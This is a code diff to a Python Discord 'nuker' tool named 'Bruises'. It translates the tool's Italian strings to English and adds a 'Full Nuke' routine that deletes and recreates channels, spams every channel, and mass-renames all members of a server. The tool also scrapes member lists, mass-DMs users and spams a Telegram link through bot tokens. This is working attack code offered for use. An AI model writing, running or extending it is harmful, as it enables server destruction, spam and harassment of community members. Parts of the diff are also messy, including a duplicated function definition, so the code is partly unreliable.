@@ -1,3 +1,5 @@
+from discord.ext import commands
+import random
 import threading
 import json
 import time
@@ -8,8 +10,44 @@ import queue
 from pystyle import *
 import discord 
 import asyncio
+from getpass import getpass
+from pystyle import Colors, Colorate, Write
+import time
+import sys
 indexed_channels = [] 
+disable_spam_menu = False
 
+# TOKEN OBFUSCATOR
+def censor_token(token):
+    if len(token) <= 4:
+        return "*" * len(token)
+    return token[:4] + "*" * (len(token) - 4)
+
+
+# FAKE LOADING BAR
+def loading_bar(duration=3):
+    bar_length = 30
+    start = time.time()
+
+    while True:
+        elapsed = time.time() - start
+        if elapsed >= duration:
+            break
+
+        progress = elapsed / duration
+        filled = int(bar_length * progress)
+
+        bar = "█" * filled + "-" * (bar_length - filled)
+
+        gradient_bar = Colorate.Horizontal(Colors.green_to_white, bar)
+
+        sys.stdout.write(f"\r[ + ]     Loading: |{gradient_bar}| {int(progress*100)}%")
+        sys.stdout.flush()
+        time.sleep(0.01)
+
+    final_bar = Colorate.Horizontal(Colors.green_to_white, "█" * bar_length)
+    sys.stdout.write(f"\r[ + ]     Loading: |{final_bar}| 100%\n")
+    sys.stdout.flush()
 
 # VARIABLES 
 msg = 0
@@ -38,14 +76,15 @@ def gradient_text(text, index, total):
 
 
 # ID SCRAPER AVANZATO
-def scrape_members(guild_id, token, file_path='scraped/members.txt'):
+def scrape_members(guild_id, token, file_path='scraped/members.txt', mode="dm"):
+
     headers = {'Authorization': f"Bot {token}"}
 
     # RUOLI
     roles_url = f"https://discord.com/api/v10/guilds/{guild_id}/roles"
     roles_resp = requests.get(roles_url, headers=headers)
     if roles_resp.status_code != 200:
-        print("Errore nel recupero dei ruoli.")
+        print("Error during roles scraping.")
         return
 
     roles_data = roles_resp.json()
@@ -68,7 +107,7 @@ def scrape_members(guild_id, token, file_path='scraped/members.txt'):
             all_members.extend(members)
             after = members[-1]['user']['id']
         else:
-            print(f"Errore scraping membri: {response.status_code}")
+            print(f"Error scraping members: {response.status_code}")
             return
 
 
@@ -82,15 +121,15 @@ def scrape_members(guild_id, token, file_path='scraped/members.txt'):
  
     print("\n")
     print(gradient_text("╔══════════════════════════════════════════════════════╗", 0, 10))
-    print(gradient_text("║              MEMBER SCRAPER COMPLETATO               ║", 2, 10))
+    print(gradient_text("║              MEMBER SCRAPER COMPLETED                ║", 2, 10))
     print(gradient_text("╠══════════════════════════════════════════════════════╣", 4, 10))
-    print(gradient_text(f"║  ✓ Membri trovati: {len(all_members):<33} ║", 5, 10))
-    print(gradient_text(f"║  ✓ Salvati in: {file_path:<34}       ║", 6, 10))
+    print(gradient_text(f"║  ✓ Members found: {len(all_members):<33}  ║", 5, 10))
+    print(gradient_text(f"║  ✓ Saved to: {file_path:<34}      ║", 6, 10))
     print(gradient_text("╚══════════════════════════════════════════════════════╝", 9, 10))
   
 
-    print(gradient_text(f"[ ✓ ] Membri trovati: {len(all_members)}", 2, 10))
-    print(gradient_text(f"[ ✓ ] Salvati in: {file_path}", 4, 10))
+    print(gradient_text(f"[ ✓ ] Members found: {len(all_members)}", 2, 10))
+    print(gradient_text(f"[ ✓ ] Saved to: {file_path}", 4, 10))
 
    
     print("\n" + gradient_text("MEMEBERS AND ROLES", 5, 10))
@@ -109,8 +148,8 @@ def scrape_members(guild_id, token, file_path='scraped/members.txt'):
         line = f"[ {idx:03} ] {uname:<20} | Ruoli: {', '.join(role_names) if role_names else 'Nessun ruolo'}"
         print(gradient_text(line, idx % 10, 10))
 
-    print("\n" + gradient_text("SKIP DM", 7, 10))
-    print("Inserisci i numeri degli utenti da saltare (es: 001, 002, 010)")
+    print("\n" + gradient_text("SKIP", 7, 10))
+    print("Enter the numbers of users to skip (e.g. 001, 002, 010)")
     raw = input("→ ").replace(" ", "")
 
     skip_list = []
@@ -125,12 +164,15 @@ def scrape_members(guild_id, token, file_path='scraped/members.txt'):
         except:
             pass
 
-    print(gradient_text(f"[ ✓ ] Salterai {len(skip_list)} utenti.", 9, 10))
+    print(gradient_text(f"[ ✓ ] Skipping {len(skip_list)} users.", 9, 10))
     print("")
 
     return all_members, skip_list
 
 # UTILITIES
+
+# FULL NUKE
+
 def print_message(action, success=True, response_code=None):
     if success:
         status = f"{Fore.GREEN}[ ~ ]"
@@ -159,15 +201,17 @@ def get_integer_input(prompt):
 
 def get_valid_token():
     while True:
-        tkn = input(f"[ + ]     Token: ")
+        tkn = input(Colorate.Horizontal(Colors.green_to_white, "[ + ]     Token: "))
         headers = {'Authorization': f"Bot {tkn}"}
-        Write.Print(f"[ + ]     Checking token.\n", Colors.green, interval=.005)
+        Write.Print("[ + ]     Checking token.\n", Colors.green_to_white, interval=.005)
         response = requests.get('https://discord.com/api/v9/users/@me', headers=headers)
         if response.status_code == 200:
-            Write.Print(f"[ + ]     Token valid.\n", Colors.green, interval=.005)
+            Write.Print("[ + ]     Token valid.\n", Colors.green_to_white, interval=.005)
+            Write.Print(f"[ + ]     Using token: {censor_token(tkn)}\n", Colors.green_to_white, interval=.005)
+            loading_bar(3)
             return tkn
         else:
-            Write.Print(f"[ + ]     Please enter a valid token.\n", Colors.green, interval=.005)
+            Write.Print("[ + ]     Invalid token. Try again.\n", Colors.green_to_white, interval=.005)
 
 
 def is_valid_guild_id(guild_id):
@@ -175,27 +219,48 @@ def is_valid_guild_id(guild_id):
     response = requests.get(f"https://discord.com/api/v9/guilds/{guild_id}", headers=headers)
     return response.status_code == 200
 
-
 # SERVERS LIST
 def select_guilds(token):
     headers = {"Authorization": f"Bot {token}"}
 
-    Write.Print("[ + ]     Fetching guilds...\n", Colors.green, interval=.005)
+    print(Colorate.Horizontal(Colors.green_to_white, "[ + ]     Fetching guilds..."))
     response = requests.get("https://discord.com/api/v10/users/@me/guilds", headers=headers)
 
+
     if response.status_code != 200:
-        print_message("Impossibile recuperare i server del bot.", success=False)
+        print_message("Impossible fetching servers.", success=False)
         return []
 
     guilds = response.json()
     if not guilds:
-        print_message("Il bot non è in nessun server.", success=False)
+        print_message("The bot is not in any server.", success=False)
         return []
 
     print("\n")
-    print("╔══════════════════════════════════════════════════════╗")
-    print("║                   SERVER DISPONIBILI                 ║")
-    print("╚══════════════════════════════════════════════════════╝\n")
+
+def select_guilds(token):
+    headers = {"Authorization": f"Bot {token}"}
+
+    print(Colorate.Horizontal(Colors.green_to_white, "[ + ]     Fetching guilds..."))
+    response = requests.get("https://discord.com/api/v10/users/@me/guilds", headers=headers)
+
+    if response.status_code != 200:
+        print(Colorate.Horizontal(Colors.red_to_white, "[ ! ]     Error fetching servers."))
+        return []
+
+    guilds = response.json()
+    if not guilds:
+        print(Colorate.Horizontal(Colors.red_to_white, "[ ! ]     No servers found."))
+        return []
+
+    header_top = "╔══════════════════════════════════════════════════════╗"
+    header_mid = "║                   SERVERS AVAILABLE                  ║"
+    header_bot = "╚══════════════════════════════════════════════════════╝"
+
+    print(Colorate.Horizontal(Colors.green_to_white, header_top))
+    print(Colorate.Horizontal(Colors.green_to_white, header_mid))
+    print(Colorate.Horizontal(Colors.green_to_white, header_bot))
+    print("")
 
     indexed = []
 
@@ -205,10 +270,10 @@ def select_guilds(token):
         indexed.append(gid)
 
         line = f"[ {idx:03} ]  {name} (ID: {gid})"
-        print(line)
+        print(Colorate.Horizontal(Colors.green_to_white, line))
 
     print("")
-    raw = input("[ + ]     Seleziona i server (es: 1, 3, 5): ").replace(" ", "")
+    raw = input(Colorate.Horizontal(Colors.green_to_white, "[ + ]     Select servers (comma separated): ")).replace(" ", "")
     selected = []
 
     if raw:
@@ -219,11 +284,14 @@ def select_guilds(token):
                 if 1 <= i <= len(indexed):
                     selected.append(indexed[i - 1])
         except:
-            print_message("Input non valido.", success=False)
+            print(Colorate.Horizontal(Colors.red_to_white, "[ ! ]     Invalid input."))
             return []
 
-    Write.Print(f"[ + ]     Server selezionati: {len(selected)}\n", Colors.green, interval=.005)
+    print(Colorate.Horizontal(Colors.green_to_white, f"[ + ]     Selected servers: {len(selected)}"))
     return selected
+
+
+  
 
 # MSG SPAM
 def spam():
@@ -234,13 +302,13 @@ def spam():
     response = requests.get(f"https://discord.com/api/v9/guilds/{svr}/channels", headers=headers)
 
     if response.status_code != 200:
-        print_message("Errore nello scraping dei canali.", success=False)
+        print_message("Error during channels scraping.", success=False)
         menu()
         return
 
     channels = response.json()
 
-    print(f"\n{Fore.GREEN}[ + ]     Canali trovati: {len(channels)}{Fore.RESET}\n")
+    print(f"\n{Fore.GREEN}[ + ]     Channels found: {len(channels)}{Fore.RESET}\n")
 
     indexed_channels = []
     for i, ch in enumerate(channels, start=1):
@@ -248,31 +316,31 @@ def spam():
         indexed_channels.append(ch['id'])
 
     print("\n")
-    print(f"{Fore.GREEN}[ 0 ]{Fore.RESET}  Spamma TUTTI i canali\n")
+    print(f"{Fore.GREEN}[ 0 ]{Fore.RESET}  Spam all channels\n")
 
     while True:
         try:
-            choice = int(input(f"{Fore.GREEN}[ + ]     Seleziona un canale (0 per tutti): {Fore.RESET}"))
+            choice = int(input(f"{Fore.GREEN}[ + ]     Select a channel (0 for all): {Fore.RESET}"))
             if 0 <= choice <= len(indexed_channels):
                 break
         except:
             pass
-        print_message("Scelta non valida.", success=False)
+        print_message("Invalid choice.", success=False)
 
-    msg_choice = input(f"{Fore.GREEN}[ + ]     Messaggio manuale (1) o file (2)? {Fore.RESET}")
+    msg_choice = input(f"{Fore.GREEN}[ + ]     Manual message (1) or file (2)? {Fore.RESET}")
 
     if msg_choice == "1":
-        message = input(f"{Fore.GREEN}[ + ]     Messaggio: {Fore.RESET}")
+        message = input(f"{Fore.GREEN}[ + ]     Message: {Fore.RESET}")
     else:
-        file_path = input(f"{Fore.GREEN}[ + ]     Percorso file: {Fore.RESET}")
+        file_path = input(f"{Fore.GREEN}[ + ]     File path: {Fore.RESET}")
         try:
             with open(file_path, "r", encoding="utf-8") as f:
                 message = f.read().strip()
         except:
-            print_message("File non trovato.", success=False)
-            message = input(f"{Fore.GREEN}[ + ]     Messaggio: {Fore.RESET}")
+            print_message("File not found.", success=False)
+            message = input(f"{Fore.GREEN}[ + ]     Message: {Fore.RESET}")
 
-    amount = get_integer_input(f"{Fore.GREEN}[ + ]     Numero di messaggi: {Fore.RESET}")
+    amount = get_integer_input(f"{Fore.GREEN}[ + ]     Number of messages: {Fore.RESET}")
 
     if choice == 0:
         threads = []
@@ -287,7 +355,10 @@ def spam():
         selected_channel = indexed_channels[choice - 1]
         send_message_to_channel(tkn, selected_channel, message, amount)
 
-    input(f"{Fore.GREEN}[ + ]     Completato. Premi invio per tornare al menu.{Fore.RESET}")
+    if disable_spam_menu:
+        return
+
+    input(f"{Fore.GREEN}[ + ]     Completed. Press enter to return to menu.{Fore.RESET}")
     menu()
 
 indexed_channels = []
@@ -330,15 +401,15 @@ def tgspam():
     # TG ACC LINK
     message = "https://t.me/bruisesalloverme"
 
-    amount = get_integer_input(f"{Fore.GREEN}[ + ]     Numero di messaggi per canale: {Fore.RESET}")
+    amount = get_integer_input(f"{Fore.GREEN}[ + ]     Number of messages per channel: {Fore.RESET}")
 
     if not indexed_channels:
-        print(f"{Fore.YELLOW}[ ! ] Carico i canali del server...{Fore.RESET}")
+        print(f"{Fore.YELLOW}[ ! ] Loading channels for the server...{Fore.RESET}")
         load_channels(tkn, svr)
 
     if not indexed_channels:
-        print(f"{Fore.RED}[ ! ] Nessun canale trovato.{Fore.RESET}")
-        input("Premi invio per tornare al menu...")
+        print(f"{Fore.RED}[ ! ] No channels found.{Fore.RESET}")
+        input("Press enter to return to menu...")
         return menu()
 
     threads = []
@@ -353,7 +424,7 @@ def tgspam():
     for t in threads:
         t.join()
 
-    input(f"{Fore.GREEN}[ + ]     Completato. Premi invio per tornare al menu.{Fore.RESET}")
+    input(f"{Fore.GREEN}[ + ]     Completed. Press enter to return to menu.{Fore.RESET}")
     menu()
 
     # CHANNELS SCRAPING  
@@ -361,14 +432,14 @@ def tgspam():
     response = requests.get(f"https://discord.com/api/v9/guilds/{svr}/channels", headers=headers)
 
     if response.status_code != 200:
-        print_message("Errore nello scraping dei canali.", success=False)
+        print_message("Error scraping channels.", success=False)
         menu()
         return
 
     channels = response.json()
 
     # CHANNEL LIST
-    print(f"\n{Fore.GREEN}[ + ]     Canali trovati: {len(channels)}{Fore.RESET}\n")
+    print(f"\n{Fore.GREEN}[ + ]     Found channels: {len(channels)}{Fore.RESET}\n")
 
     indexed_channels = []
     for i, ch in enumerate(channels, start=1):
@@ -376,33 +447,33 @@ def tgspam():
         indexed_channels.append(ch['id'])
 
     print("\n")
-    print(f"{Fore.GREEN}[ 0 ]{Fore.RESET}  Spamma TUTTI i canali\n")
+    print(f"{Fore.GREEN}[ 0 ]{Fore.RESET}  Spam ALL channels\n")
 
     # CHANNEL CHOICHE
     while True:
         try:
-            choice = int(input(f"{Fore.GREEN}[ + ]     Seleziona un canale (0 per tutti): {Fore.RESET}"))
+            choice = int(input(f"{Fore.GREEN}[ + ]     Select a channel (0 for all): {Fore.RESET}"))
             if 0 <= choice <= len(indexed_channels):
                 break
         except:
             pass
-        print_message("Scelta non valida.", success=False)
+        print_message("Invalid choice.", success=False)
 
     # MESSAGE
-    msg_choice = input(f"{Fore.GREEN}[ + ]     Messaggio manuale (1) o file (2)? {Fore.RESET}")
+    msg_choice = input(f"{Fore.GREEN}[ + ]     Manual message (1) or file (2)? {Fore.RESET}")
 
     if msg_choice == "1":
-        message = input(f"{Fore.GREEN}[ + ]     Messaggio: {Fore.RESET}")
+        message = input(f"{Fore.GREEN}[ + ]     Message: {Fore.RESET}")
     else:
-        file_path = input(f"{Fore.GREEN}[ + ]     Percorso file: {Fore.RESET}")
+        file_path = input(f"{Fore.GREEN}[ + ]     File path: {Fore.RESET}")
         try:
             with open(file_path, "r", encoding="utf-8") as f:
                 message = f.read().strip()
         except:
-            print_message("File non trovato.", success=False)
-            message = input(f"{Fore.GREEN}[ + ]     Messaggio: {Fore.RESET}")
+            print_message("File not found.", success=False)
+            message = input(f"{Fore.GREEN}[ + ]     Message: {Fore.RESET}")
 
-    amount = get_integer_input(f"{Fore.GREEN}[ + ]     Numero di messaggi: {Fore.RESET}")
+    amount = get_integer_input(f"{Fore.GREEN}[ + ]     Number of messages: {Fore.RESET}")
 
     # SPAM 
     if choice == 0:
@@ -420,7 +491,7 @@ def tgspam():
         selected_channel = indexed_channels[choice - 1]
         send_message_to_channel(tkn, selected_channel, message, amount)
 
-    input(f"{Fore.GREEN}[ + ]     Completato. Premi invio per tornare al menu.{Fore.RESET}")
+    input(f"{Fore.GREEN}[ + ]     Completed. Press enter to return to menu.{Fore.RESET}")
     menu()
 
 # TG SPAM
@@ -430,11 +501,11 @@ def tgspam():
     # MESSAGE
     message = "https://t.me/bruisesalloverme"
 
-    amount = get_integer_input(f"{Fore.GREEN}[ + ]     Numero di messaggi per canale: {Fore.RESET}")
+    amount = get_integer_input(f"{Fore.GREEN}[ + ]     Number of messages per channel: {Fore.RESET}")
 
 
     if not indexed_channels:
-        print(f"{Fore.YELLOW}[ ! ] Carico i canali del server...{Fore.RESET}")
+        print(f"{Fore.YELLOW}[ ! ] Loading channels for the server...{Fore.RESET}")
         load_channels(tkn, svr)
 
     threads = []
@@ -449,7 +520,7 @@ def tgspam():
     for t in threads:
         t.join()
 
-    input(f"{Fore.GREEN}[ + ]     Completato. Premi invio per tornare al menu.{Fore.RESET}")
+    input(f"{Fore.GREEN}[ + ]     Completed. Press enter to return to menu.{Fore.RESET}")
     menu()
 
 # CHANNEL MANAGEMENT
@@ -542,8 +613,6 @@ def dm_all_users(token, server, message, amount=1, file_path='scraped/members.tx
         else:
             print_message(f"Error creating DM channel with user {user_id}: {response.status_code}",
                           False, response.status_code)
-
-    # closing function
     for user_id in user_ids:
         send_dm(user_id)
 
@@ -568,9 +637,7 @@ def menu():
         input(f"{Fore.GREEN}[ + ]     Press enter to go back...")
         menu()
     elif option == "4":
-        channeldelete()
-        channelcreate()
-        spam()
+        full_nuke()
         input(f"{Fore.GREEN}[ + ]     Press enter to go back...")
         menu()
 
@@ -582,16 +649,16 @@ def menu():
         # AUTOMATIC ID SCRAPING FOR DM SPAM
         scrape_members(svr, tkn)
 
-        choice = input(f"{Fore.GREEN}[ + ]     Vuoi scrivere il messaggio (1) o dare il percorso di un file (2)? {Fore.RESET}")
+        choice = input(f"{Fore.GREEN}[ + ]     Manually write the message (1) or use a file (2)? {Fore.RESET}")
         if choice == "1":
             message = input(f"{Fore.RED}[ + ]     Message: ")
         else:
-            file_path = input(f"{Fore.GREEN}[ + ]     Inserisci il percorso completo del file (es. C:\\Users\\franc\\Desktop\\Tools\\DS Nuker\\message.txt): {Fore.RESET}")
+            file_path = input(f"{Fore.GREEN}[ + ]     Enter the full path of the file (e.g. C:\\Users\\franc\\Desktop\\Tools\\DS Nuker\\message.txt): {Fore.RESET}")
             try:
                 with open(file_path, "r", encoding="utf-8") as f:
                     message = f.read().strip()
             except FileNotFoundError:
-                print_message("File non trovato, scrivi il messaggio manualmente.", success=False)
+                print_message("File not found, writing the message manually.", success=False)
                 message = input(f"{Fore.RED}[ + ]     Message: ")
 
         amount = get_integer_input(f"{Fore.GREEN}[ + ]     How many messages per user: {Fore.RESET}")
@@ -599,17 +666,96 @@ def menu():
         input(f"{Fore.GREEN}[ + ]     Press enter to go back...")
         menu()
     
+    elif option == "7":
+        rename_members_menu()
+        input(f"{Fore.GREEN}[ + ]     Press enter to go back...")
+        menu()    
+    
     else:
         print(f"{Fore.RED} Invalid option. ")
         menu()
-        
+
+#RENAME MEMBERS
+def rename_members_rest(guild_id, token, new_nickname, all_members, skip_list=None):
+    if skip_list is None:
+        skip_list = []
+
+    headers = {
+        "Authorization": f"Bot {token}",
+        "Content-Type": "application/json"
+    }
+
+    url = f"https://discord.com/api/v10/guilds/{guild_id}/members/{{}}"
+
+    success = 0
+    failure = 0
+
+    for m in all_members:
+        user_id = m["user"]["id"]
+
+        if user_id in skip_list:
+            continue
+
+        payload = {"nick": new_nickname}
+
+        r = requests.patch(url.format(user_id), headers=headers, json=payload)
+
+        if r.status_code in (200, 204):
+            success += 1
+        else:
+            failure += 1
+
+    return success, failure
+
+def rename_members_menu():
+    global tkn, svr
+
+    new_nickname = input(f"{Fore.GREEN}[ + ]     Inserisci il nickname da assegnare a tutti i membri: {Fore.RESET}")
+
+    # SCRAPE TO RENAME
+    all_members, skip_list = scrape_members(svr, tkn, mode="rename")
+
+    # RENAME USING REST
+    success, failure = rename_members_rest(svr, tkn, new_nickname, all_members, skip_list)
+
+    print(f"{Fore.GREEN}[ + ] Rinominati: {success}{Fore.RESET}")
+    print(f"{Fore.RED}[ + ] Falliti: {failure}{Fore.RESET}")
+
+    input(f"{Fore.GREEN}[ + ]     Press enter to go back...")
+    menu()
+
+
+def full_nuke():
+    global tkn, svr, disable_spam_menu
+    disable_spam_menu = True
+    channeldelete()
+    channelcreate()
+    spam()  
+    disable_spam_menu = False
+    new_nickname = input(f"{Fore.GREEN}[ + ]     Insert the nickname to assign to all members: {Fore.RESET}")
+    # SCRAPING MEMBERS TO RENAME
+    all_members, skip_list = scrape_members(svr, tkn)
+
+# RENAME VIA REST
+    success, failure = rename_members_rest(svr, tkn, new_nickname, all_members, skip_list)
+
+    print(f"{Fore.GREEN}[ + ] Renamed: {success}{Fore.RESET}")
+    print(f"{Fore.RED}[ + ] Failed to rename: {failure}{Fore.RESET}")
+
+    input(f"{Fore.GREEN}[ + ]     Press enter to go back...")
+    menu()
+   
 # BANNER
 ascii = """
-▄▄▌ ▐ ▄▌▄▄▄ .     ▄▄▄· ▄▄▌  ▄▄▌       ▄▄ •        ▐ ▄     ·▄▄▄▄  ▪  ▄▄▄ .
-██· █▌▐█▀▄.▀·    ▐█ ▀█ ██•  ██•      ▐█ ▀ ▪▪     •█▌▐█    ██▪ ██ ██ ▀▄.▀·
-██▪▐█▐▐▌▐▀▀▪▄    ▄█▀▀█ ██▪  ██▪      ▄█ ▀█▄ ▄█▀▄ ▐█▐▐▌    ▐█· ▐█▌▐█·▐▀▀▪▄
-▐█▌██▐█▌▐█▄▄▌    ▐█ ▪▐▌▐█▌▐▌▐█▌▐▌    ▐█▄▪▐█▐█▌.▐▌██▐█▌    ██. ██ ▐█▌▐█▄▄▌
- ▀▀▀▀ ▀▪ ▀▀▀      ▀  ▀ .▀▀▀ .▀▀▀     ·▀▀▀▀  ▀█▄▀▪▀▀ █▪    ▀▀▀▀▀• ▀▀▀ ▀▀▀ 
+▀█████████▄     ▄████████ ███    █▄   ▄█     ▄████████    ▄████████    ▄████████ 
+  ███    ███   ███    ███ ███    ███ ███    ███    ███   ███    ███   ███    ███ 
+  ███    ███   ███    ███ ███    ███ ███▌   ███    █▀    ███    █▀    ███    █▀  
+ ▄███▄▄▄██▀   ▄███▄▄▄▄██▀ ███    ███ ███▌   ███         ▄███▄▄▄       ███        
+▀▀███▀▀▀██▄  ▀▀███▀▀▀▀▀   ███    ███ ███▌ ▀███████████ ▀▀███▀▀▀     ▀███████████ 
+  ███    ██▄ ▀███████████ ███    ███ ███           ███   ███    █▄           ███ 
+  ███    ███   ███    ███ ███    ███ ███     ▄█    ███   ███    ███    ▄█    ███ 
+▄█████████▀    ███    ███ ████████▀  █▀    ▄████████▀    ██████████  ▄████████▀  
+               ███    ███                                                        
 
                         t.me/bruisesalloverme"""                                  
 
@@ -617,9 +763,11 @@ ascii2 = """
 ╔════════════════════════════════╦════════════════════════════════╦════════════════════════════════╗
 ║ [ 1 ] - Spam all channels      ║ [ 2 ] - Create channels        ║ [ 3 ] - Delete channels        ║
 ╠════════════════════════════════╬════════════════════════════════╬════════════════════════════════╣
-║ [ 4 ] - Full Nuke              ║[ 5 ] - TG Spam                 ║[ 6 ] - Mass Dm                 ║
-╚════════════════════════════════╩════════════════════════════════╩════════════════════════════════╝"""
-
+║ [ 4 ] - Full Nuke              ║ [ 5 ] - TG Spam                ║ [ 6 ] - Mass Dm                ║
+╠════════════════════════════════╬════════════════════════════════╩════════════════════════════════╩
+║ [ 7 ] - Rename Members         ║
+╚════════════════════════════════╩
+"""
 # START TOOL
 clear()
 set_console_title("Bruises")
